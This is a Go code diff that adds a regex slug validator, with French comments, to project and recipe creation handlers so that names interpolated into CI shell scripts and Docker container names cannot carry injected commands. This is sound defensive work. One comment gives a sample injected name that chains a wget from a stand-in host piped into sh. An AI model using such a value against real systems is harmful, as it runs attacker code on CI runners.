@@ -4,6 +4,7 @@ import (
 	"encoding/json"
 	"fmt"
 	"net/http"
+	"regexp"
 	"strings"
 
 	"github.com/go-chi/chi/v5"
@@ -11,6 +12,20 @@ import (
 	"github.com/yourorg/symphony/internal/providers"
 	"github.com/yourorg/symphony/internal/templates"
 )
+
+// validSlug contraint tout identifiant qui finit interpolé dans un script
+// shell de pipeline CI (nom de projet -> {{.ServiceName}}, nom de recette ->
+// $RECETTE_NAME) ou utilisé comme nom de container Docker. Sans cette
+// validation, un nom comme "x; wget evil|sh" atteint un shell qui tourne sur
+// un runner avec accès au socket Docker de l'hôte — injection de commande.
+var validSlug = regexp.MustCompile(`^[a-z][a-z0-9-]{0,62}$`)
+
+func validateSlug(name string) error {
+	if !validSlug.MatchString(name) {
+		return fmt.Errorf("doit commencer par une lettre minuscule et ne contenir que des minuscules, chiffres et tirets (63 caractères max)")
+	}
+	return nil
+}
 
 type CreateProjectRequest struct {
 	Name        string `json:"name"`
@@ -58,6 +73,10 @@ func (s *Server) createProject(w http.ResponseWriter, r *http.Request) {
 	}
 	if req.Name == "" {
 		respond(w, http.StatusBadRequest, map[string]string{"error": "name requis"})
+		return
+	}
+	if err := validateSlug(req.Name); err != nil {
+		respond(w, http.StatusBadRequest, map[string]string{"error": "name: " + err.Error()})
 		return
 	}
 	if req.Language == "" {
@@ -247,6 +266,10 @@ func (s *Server) createRecette(w http.ResponseWriter, r *http.Request) {
 	}
 	if req.RecetteName == "" || req.Port == 0 {
 		respond(w, http.StatusBadRequest, map[string]string{"error": "recette_name et port requis"})
+		return
+	}
+	if err := validateSlug(req.RecetteName); err != nil {
+		respond(w, http.StatusBadRequest, map[string]string{"error": "recette_name: " + err.Error()})
 		return
 	}
 
